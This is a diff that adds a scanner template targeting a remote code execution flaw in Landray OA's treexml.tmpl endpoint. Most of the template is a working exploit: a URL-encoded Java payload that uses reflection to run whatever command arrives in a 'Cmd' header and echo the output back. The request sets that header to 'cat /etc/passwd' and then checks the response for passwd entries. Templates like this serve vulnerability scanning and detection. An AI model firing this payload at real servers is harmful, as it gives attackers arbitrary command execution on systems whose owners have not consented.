@@ -1,0 +1,30 @@
+id: landray-oa-treexml-rce
+
+info:
+  name: Landray OA treexml.tmpl RCE
+  author: xiaobaicai
+  severity: critical
+  description: |
+    This template exploits a remote code execution vulnerability in Landray OA's `treexml.tmpl` endpoint. When triggered, the vulnerability allows an attacker to execute arbitrary commands on the server.
+  reference:
+    - http://wiki.peiqi.tech/wiki/oa/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA%20treexml.tmpl%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.html
+
+http:
+  - raw:
+      - |
+        POST /data/sys-common/treexml.tmpl HTTP/1.1
+        Host: {{Hostname}}
+        Cmd: cat /etc/passwd
+        Content-Type: application/x-www-form-urlencoded
+        Pragma: no-cache
+
+        s_bean=ruleFormulaValidate&script=%20%20%20%20boolean%20flag%20=%20false;%20ThreadGroup%20group%20=%20Thread.currentThread().getThreadGroup();java.lang.reflect.Field%20f%20=%20group.getClass().getDeclaredField("threads");f.setAccessible(true);Thread[]%20threads%20=%20(Thread[])%20f.get(group);for%20(int%20i%20=%200;%20i%20<%20threads.length;%20i++)%20{try%20{Thread%20t%20=%20threads[i];if%20(t%20==%20null)%20{continue;}String%20str%20=%20t.getName();if%20(str.contains("exec")%20||%20!str.contains("http"))%20{continue;}f%20=%20t.getClass().getDeclaredField("target");f.setAccessible(true);Object%20obj%20=%20f.get(t);if%20(!(obj%20instanceof%20Runnable))%20{continue;}f%20=%20obj.getClass().getDeclaredField("this$0");f.setAccessible(true);obj%20=%20f.get(obj);try%20{f%20=%20obj.getClass().getDeclaredField("handler");%20}%20catch%20(NoSuchFieldException%20e)%20{f%20=%20obj.getClass().getSuperclass().getDeclaredField("handler");%20}f.setAccessible(true);obj%20=%20f.get(obj);f%20=%20obj.getClass().getDeclaredField("processors");f.setAccessible(true);java.util.List%20processors%20=%20(java.util.List)%20f.get(obj);for%20(int%20j%20=%200;%20j%20<%20processors.size();%20++j){Object%20processor%20=%20processors.get(j);f%20=%20processor.getClass().getDeclaredField("req");f.setAccessible(true);Object%20req%20=%20f.get(processor);Object%20resp%20=%20req.getClass().getMethod("getResponse",%20new%20Class[0]).invoke(req,new%20Object[0]);str%20=%20(String)%20req.getClass().getMethod("getHeader",%20new%20Class[]{String.class}).invoke(req,new%20Object[]{"Cmd"});if%20(str%20!=%20null%20&&%20!str.isEmpty()){resp.getClass().getMethod("setStatus",%20new%20Class[]{int.class}).invoke(resp,new%20Object[]{200});String[]%20cmds%20=%20System.getProperty("os.name").toLowerCase().contains("window")%20?%20new%20String[]{"cmd.exe",%20"/c",%20str}%20:%20new%20String[]{"/bin/sh",%20"-c",%20str};String%20charsetName%20=%20System.getProperty("os.name").toLowerCase().contains("window")%20?"GBK":"UTF-8";byte[]%20text2%20=(new%20java.util.Scanner((new%20ProcessBuilder(cmds)).start().getInputStream(),charsetName)).useDelimiter("\\A").next().getBytes(charsetName);byte[]%20result=("Execute:%20%20%20%20"+new%20String(text2,"utf-8")).getBytes(charsetName);try{Class%20cls%20=%20Class.forName("org.apache.tomcat.util.buf.ByteChunk");obj%20=%20cls.newInstance();cls.getDeclaredMethod("setBytes",%20new%20Class[]{byte[].class,%20int.class,%20int.class}).invoke(obj,%20new%20Object[]{result,%20new%20Integer(0),%20new%20Integer(result.length)});resp.getClass().getMethod("doWrite",%20new%20Class[]{cls}).invoke(resp,%20new%20Object[]{obj});%20}%20catch%20(NoSuchMethodException%20var5){Class%20cls%20=%20Class.forName("java.nio.ByteBuffer");obj%20=%20cls.getDeclaredMethod("wrap",%20new%20Class[]{byte[].class}).invoke(cls,%20new%20Object[]{result});resp.getClass().getMethod("doWrite",%20new%20Class[]{cls}).invoke(resp,%20new%20Object[]{obj});%20}flag%20=%20true;}if%20(flag)%20{break;}}if%20(flag)%20{break;}}%20catch%20(Exception%20e)%20{continue;}}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "root:[^:]*:[0-9]*:[0-9]*:[^:]*"
+        part: body
